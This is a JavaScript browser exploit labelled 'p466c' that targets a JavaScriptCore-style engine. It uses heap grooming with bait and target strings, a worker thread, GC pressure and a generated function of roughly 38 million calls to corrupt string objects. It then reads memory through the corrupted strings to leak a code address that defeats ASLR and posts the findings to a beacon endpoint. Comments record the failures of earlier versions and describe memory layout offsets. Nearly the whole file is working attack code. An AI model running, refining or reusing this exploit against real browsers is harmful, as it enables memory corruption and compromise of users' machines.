// p466c — ASLR extraction via PROVEN p156 bait-and-switch
//
// WHY V466/V466B FAILED:
//   1. Scanned for 0xFFFFFFFF at entry+12 — but m_slowPathCount is ZERO during finishCreation
//   2. V466B: worker ABs might have pushed strings out of sweep path
//   3. V466B: did NOT call the function (p156 calls it and gets 14/14 corruption)
//
// FIX: Exact p156 reproduction (proven 14/14 corruption) with:
//   - Function CALL (triggers execution-time metadata writes)
//   - No extra AB allocations in worker (keep layout identical to p156)
//   - Comprehensive data extraction: .length, charCodeAt scan, entry alignment
//   - Scan for thunk address at entry+24 (non-zero 8 bytes, NOT 0xFFFFFFFF)
//
// Per-entry layout during finishCreation (JIT=OFF):
//   +0-11:  PackedRawSentinelNode (zeroed)
//   +12-15: m_slowPathCount = 0 (NOT 0xFFFFFFFF!)
//   +16-23: m_doneLocation = 0 or code addr
//   +24-31: m_slowPathCallDestination = THUNK ADDR (8 bytes = ASLR LEAK)
//   +32-63: union + WriteBarriers (mostly zeroed)
//   +64-67: bit fields + padding
//   +68-71: m_bytecodeIndex = sequential index
//   +72-83: ArrayProfile (zeroed)
//   +84-87: padding
//   +88-111: ValueProfile (zeroed)
//
// After execution, additional writes: m_slowPathCount++, ValueProfile, etc.
//
// Beacon prefix: V466C-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V466C-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ── WORKER CODE (identical to p156 but with enhanced extraction) ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41; // 'A'

    function beacon(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V466C-W-' + tag, false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body || '');
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var count = e.data.count;
        for (var i = 0; i < count; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // resolve rope
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        // BUSY LOOP — detect corruption immediately
        var found = false;
        var iterations = 0;

        while (!found && iterations < 5000000) {
          for (var i = 0; i < targets.length; i++) {
            try {
              var len = targets[i].length;
              if (len !== STR_LEN) {
                beacon('FIRST-HIT-' + i + '-len' + len);
                found = true;
                break;
              }
            } catch(ex) {
              beacon('LEN-ERR-' + i);
              found = true;
              break;
            }
          }
          iterations++;
          if (iterations % 1000000 === 0) beacon('POLL-' + iterations);
        }

        if (!found) {
          beacon('TIMEOUT-' + iterations);
        }

        // ── COMPREHENSIVE EXTRACTION ──
        beacon('EXTRACTING');
        var allLens = [];

        for (var i = 0; i < targets.length; i++) {
          var len = -1;
          try { len = targets[i].length; } catch(ex) { len = -2; }

          if (len === STR_LEN) continue; // not corrupted

          allLens.push(i + ':' + len);

          // Report the .length value (might be bytecodeIndex or other entry data)
          beacon('LEN-' + i, '' + len);

          // Try to read .length as hex (might be a pointer fragment)
          if (len > 0 && len < 0x7FFFFFFF) {
            beacon('LENHEX-' + i, '0x' + len.toString(16));
          }

          // Try charCodeAt at strategic offsets with try/catch
          // If this is a rope, charCodeAt calls resolveRope which may crash
          // If non-rope, charCodeAt dereferences m_fiber→StringImpl→m_data8
          var chars = '';
          var maxRead = Math.min(len > 0 ? len : 0, 224); // 2 entries worth
          var readOK = 0;
          for (var c = 0; c < maxRead; c++) {
            try {
              var ch = targets[i].charCodeAt(c);
              chars += hx(ch >> 8) + hx(ch & 0xFF);
              readOK++;
            } catch(ex) {
              chars += 'XXXX';
              break;
            }
          }

          if (readOK > 0) {
            beacon('CHARS-' + i, 'n=' + readOK + ':' + chars.substring(0, 400));
            if (chars.length > 400) beacon('CHARS2-' + i, chars.substring(400, 800));
          }

          // Also try reading at 112-byte intervals (entry boundaries)
          // to find the repeating pattern
          if (len > 224) {
            var stride112 = '';
            for (var s = 0; s < 5; s++) {
              var off = s * 112;
              if (off >= len) break;
              try {
                var v24 = '';
                // Read 8 bytes at entry+24 (thunk address position)
                for (var b = 0; b < 8; b++) {
                  var ch = targets[i].charCodeAt(off + 24 + b);
                  v24 += hx(ch >> 8) + hx(ch & 0xFF);
                }
                stride112 += 'e' + s + '@' + (off+24) + ':' + v24 + ',';
              } catch(ex) {
                stride112 += 'e' + s + ':ERR,';
                break;
              }
            }
            beacon('STRIDE-' + i, stride112);
          }

          // Try BigInt conversion of .length for high values
          if (len > 0xFFFFFF) {
            try {
              beacon('BIGLEN-' + i, BigInt(len).toString(16));
            } catch(ex) {}
          }
        }

        // Summary of all corrupted .length values
        beacon('LENS', allLens.join('|'));

        // Count uncorrupted
        var clean = 0;
        for (var i = 0; i < targets.length; i++) {
          try { if (targets[i].length === STR_LEN) clean++; } catch(ex) {}
        }
        beacon('SUMMARY', 'corrupt=' + (targets.length - clean) + ',clean=' + clean + ',total=' + targets.length);
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (main thread, lower marge pages) ──
  // Identical to p156
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS (no ABs!) ──
  worker.onmessage = function(e) {
    if (e.data.ready) {
      phaseFreeBaits();
    }
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-PRESSURE-' + gcRound);
        phaseBuildOverflow();
      }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD 38M FUNCTION ──
  function phaseBuildOverflow() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';

    var parts = ['window.__v466cfn=function(a){'];
    for (var ch = 0; ch < nC; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v466cok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__v466cok ? 'OK' : 'FAIL'));
      if (!window.__v466cfn) { B('NO-FN'); return; }

      // ── PHASE 5: START WORKER WATCHING, THEN CALL FUNCTION ──
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v466cfn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 60));
        }
        B('SURVIVED');
      }, 200);
    };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
